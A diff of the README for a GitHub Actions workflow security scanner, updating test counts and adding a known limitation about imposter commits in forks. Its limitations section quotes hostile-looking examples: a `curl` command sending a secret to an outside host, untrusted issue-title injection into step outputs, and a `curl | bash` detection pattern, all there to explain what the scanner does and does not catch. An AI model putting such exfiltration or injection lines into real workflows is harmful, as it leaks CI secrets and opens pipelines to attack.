@@ -17,7 +17,7 @@
 [![MIT License](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-license.svg)](LICENSE)
 [![Ruff lint](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-ruff.svg)](https://github.com/astral-sh/ruff)
 [![Checked with mypy](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-mypy.svg)](https://mypy-lang.org/)
-[![447 tests passing](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-tests.svg)](https://github.com/Paulo-Marcos-Lucio/esteira/actions/workflows/ci.yml)
+[![451 tests passing](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-tests.svg)](https://github.com/Paulo-Marcos-Lucio/esteira/actions/workflows/ci.yml)
 [![96% coverage](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-coverage.svg)](https://github.com/Paulo-Marcos-Lucio/esteira/actions/workflows/ci.yml)
 [![OWASP Top 10:2025](https://raw.githubusercontent.com/Paulo-Marcos-Lucio/esteira/main/assets/chip-owasp.svg)](https://owasp.org/Top10/)
 
@@ -93,7 +93,7 @@ In the same audit, `unpinned-container-image` now anchors the finding on the **s
 
 ## 🔬 What was measured
 
-Numbers from this run — all **reproducible with `pytest` in this repository** (447 passing tests). These aren't marketing estimates; they're the ruler that catches regressions.
+Numbers from this run — all **reproducible with `pytest` in this repository** (451 passing tests). These aren't marketing estimates; they're the ruler that catches regressions.
 
 > **Honest comparison against zizmor** (the domain's mature incumbent): the suite's reproducible benchmark lives at [guardiao/BENCHMARK.md](https://github.com/Paulo-Marcos-Lucio/guardiao/blob/main/BENCHMARK.md) — pinned versions and commits — and it states where Esteira finds less than zizmor. Where Esteira wins is precision on a clean repository and calibration; **we don't sell coverage superiority**.
 
@@ -238,7 +238,7 @@ missing header — a secrets scanner should have the more sensitive trigger.
 `--only`/`--skip` reduce the set of checks that actually ran. A trimmed scan with **no findings** certifies only what was executed, not the whole repository — treating it as a pass would be an eternal false green in the CI of anyone running a single check. So coverage is **declared**, on three fronts:
 
 - **Console:** the clean verdict is qualified — the tool's output is PT-BR (`✓ Nenhum problema nas checagens executadas`, then `Cobertura parcial (N de M checagens) … Não avaliado: <ids>`). The same line also prints when there are findings (having found something doesn't prove the rest of the catalog was clean).
-- **JSON:** a `coverage` block with `partial` (the flag the dashboard reads), `ran`, `base_total`, `omitted_by_operator` (the checks left out by `--only`/`--skip`) and `known_gaps` (the classes **no** check in the catalog covers — constant per tool version, independent of the repository and the scope; it's the "Known limitations" section below, also for machines).
+- **JSON:** a `coverage` block with `partial` (the flag the dashboard reads), `ran`, `base_total`, `omitted_by_operator` (the checks left out by `--only`/`--skip`) and `known_gaps` (the classes **no** check in the catalog covers, two today — constant per tool version, independent of the repository and the scope; it's the "Known limitations" section below, also for machines).
 - **CI gate:** a partial scan **does not pass green** — it exits with code `1` even with no findings. To run a single check on purpose without failing the build, use `--fail-on none` (the explicit escape hatch, which turns off the gate entirely).
 
 ---
@@ -306,7 +306,7 @@ src/esteira/
 
 ## 🔬 Engineering quality & method
 
-**Gates, measured right now in this repo:** 447 passing tests (including *property-based* tests with Hypothesis) · **97%** coverage (gate `--cov-fail-under=93`, the measured value rounded down — an anti-regression lock, not an aspiration) · `mypy --strict` clean (19 files) · `ruff` lint + format clean (58 files) · CI on a **Python 3.10 / 3.11 / 3.12 / 3.13** matrix (`fail-fast: false`). The command lives in `pyproject.toml`, not in the YAML: dev and CI run the same line.
+**Gates, measured right now in this repo:** 451 passing tests (including *property-based* tests with Hypothesis) · **97%** coverage (gate `--cov-fail-under=93`, the measured value rounded down — an anti-regression lock, not an aspiration) · `mypy --strict` clean (19 files) · `ruff` lint + format clean (58 files) · CI on a **Python 3.10 / 3.11 / 3.12 / 3.13** matrix (`fail-fast: false`). The command lives in `pyproject.toml`, not in the YAML: dev and CI run the same line.
 
 **A test that fails the façade, not the appearance.** Severity is what decides whether the client's CI fails; that's why it's pinned in an independent dict and compared against the catalog in `test_severidade_de_toda_checagem_esta_fixada` — downgrading `script-injection` from Critical to Low (which would open the gate) fails the suite before merge. A companion meta-test requires that **every** new check be born with a positive case that actually fires; and the ReDoS test **times itself**: the fixed form of `curl | bash` runs in < 0.5 s where the broken one took 7.1 s, with a sibling test guaranteeing that "got fast" didn't turn into "stopped detecting."
 
@@ -337,6 +337,7 @@ Static analysis doesn't replace human review, and Esteira is upfront about what 
 
 - **Secret exfiltration over the network** (`curl -d "t=${{ secrets.X }}" host`) is not flagged: sending a token to a legitimate host (`Authorization: Bearer`) is normal usage, and flagging it would generate too many false positives. What is flagged is the secret printed to stdout (`echo`/`printf` in `run:`, `console.log`/`core.info` in `github-script`) and the secret exported to `$GITHUB_ENV`. **`$GITHUB_OUTPUT` is not yet flagged** — the propagation is analogous, but it hasn't been field-adjudicated, and an unmeasured rule is potential noise.
 - **Taint propagation through `steps.*.outputs` / `needs.*.outputs`** is not tracked: if a step captures untrusted context into an output (`echo "x=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"`) and **another** step later interpolates `${{ steps.id.outputs.x }}` directly in `run:`, only the **origin line** is flagged — the second use passes through. This is a deliberate trade-off: flagging every `steps.*.outputs`/`needs.*.outputs` in shell would generate too many false positives (most outputs carry trusted data). Fix the origin — that's where the alert shows up. Also machine-readable: `coverage.known_gaps` in the JSON (id `outputs-propagation-untracked`).
+- **Pinning by SHA confirms the format, not the origin.** `unpinned-action-thirdparty`/`unpinned-action-firstparty` only check whether the reference is a full 40-character SHA instead of a mutable tag/branch — no check confirms that commit actually belongs to the declared `owner/repo`'s history, rather than to one of its forks. GitHub resolves `uses: owner/repo@sha` against the Git object graph **shared** between a repository and its forks: a commit that exists only in a fork resolves the same way (an "imposter commit"), and a self-scan that's 100% SHA-pinned says nothing about that risk. Adnan Khan's public research on the `angular/dev-infra` compromise (Dec 2025, a US$31,337 bounty paid by Google) documents exactly this class: the impact path discussed was a version-bump PR repointing a pinned SHA to a commit that existed only in a fork of `actions/checkout` — a "SHA bump" that passes review without the reviewer confirming the origin. Confirming the genuine origin requires a network call to the GitHub API, outside this tool's deliberately offline scope; free alternative for that specific check: [`clank`](https://github.com/chainguard-dev/clank) (open source). Also machine-readable: `coverage.known_gaps` in the JSON (id `sha-pin-fork-origin-unverified`).
 - **`with.args`/`entrypoint` of `docker://` actions** are not inspected; the execution sinks scanned are `run:` and the `script:` of `actions/github-script`.
 - **Runner coverage** is limited to literal labels and statically resolvable `matrix` values; a `runs-on` with a dynamic, non-resolvable expression is not classified.
 - **`curl | bash` with more than 3 chained wrappers** (`sudo env time nice …`) stops matching. This is a deliberate trade-off: the unbounded form of the pattern had exponential backtracking, and a 129-character `run:` line stalled the scan for 7 s (and a ~160-character one, for hours) — a DoS of the audit gate itself.
